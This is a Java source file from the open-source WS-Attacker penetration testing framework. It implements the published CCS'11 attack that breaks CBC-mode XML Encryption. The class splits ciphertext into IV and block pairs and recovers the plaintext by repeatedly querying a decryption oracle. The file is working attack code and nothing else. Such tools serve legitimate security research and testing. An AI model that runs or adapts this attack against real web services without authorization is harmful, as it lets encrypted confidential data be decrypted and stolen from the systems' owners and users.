/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.xmlencryptionattack.attackengine.attacker.cbc;

import java.util.Arrays;
import wsattacker.library.xmlencryptionattack.attackengine.attackbase.CCAAttack;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.AOracle;
import static wsattacker.library.xmlencryptionattack.util.XMLEncryptionConstants.CryptoTechnique.SYMMETRIC;

/**
 * The complete implementation of the attack presented at CCS'11: How To Break XML Encryption (by Tibor Jager and Juraj
 * Somorovsky) Link: https://www.nds.ruhr-uni-bochum.de/research/publications/breaking-xml- encryption/ I have to admit:
 * the code is pretty ugly, sorry for that. Currently working only for 16-byte long blocks (AES)!!!
 * 
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 */
public class CBCAttacker
    extends CCAAttack
{

    /**
     * iv with encrypted blocks
     */
    private final byte[] encryptedData;

    /**
     * m_Oracle
     */
    // private AOracle m_Oracle; -> in base-class (dk)
    /**
     * block size according to the encryption method
     */
    private final int blockSize;

    /**
     * CBCAttacker constructor
     * 
     * @param encryptedData iv with the encrypted blocks
     * @param oracle
     * @param blockSize
     */
    public CBCAttacker( byte[] encryptedData, AOracle oracle, final int blockSize )
    {
        this.m_CryptoTechnique = SYMMETRIC;
        this.encryptedData = encryptedData.clone();
        this.m_Oracle = oracle;
        this.blockSize = blockSize;
    }

    /**
     * execute attack on the given ciphertext using the existing m_Oracle
     * 
     * @return
     */
    @Override
    public byte[] executeAttack()
    {
        byte[] paddedDecryptedData = new byte[encryptedData.length - blockSize];
        int lastBlockLength = 0;
        int blockPairNumber = ( encryptedData.length / blockSize ) - 1;
        // split the encrypted data in the pairs of blocks and proceed for
        // each pair independently
        FindIVMethodProperties.Type type = FindIVMethodProperties.Type.UNDEFINED;
        for ( int i = 0; i < blockPairNumber; i++ )
        {
            boolean processingLastBlock = ( i == ( blockPairNumber - 1 ) );
            int start = i * blockSize;
            byte[] iv = Arrays.copyOfRange( encryptedData, start, start + blockSize );
            byte[] c1 = Arrays.copyOfRange( encryptedData, start + blockSize, start + 2 * blockSize );
            FindIVMethodSimple fim = new FindIVMethodSimple( m_Oracle, iv, c1, processingLastBlock, type );
            byte[] decrypted = fim.executeAttack();
            System.arraycopy( decrypted, 0, paddedDecryptedData, start, decrypted.length );
            lastBlockLength = decrypted.length;
            if ( type == FindIVMethodProperties.Type.UNDEFINED )
            {
                // since we already know the server type...
                type = fim.getProperties().getType();
            }
        }
        final int resultLength = paddedDecryptedData.length - blockSize + lastBlockLength;
        byte[] result = Arrays.copyOf( paddedDecryptedData, resultLength );
        return result;
    }
}
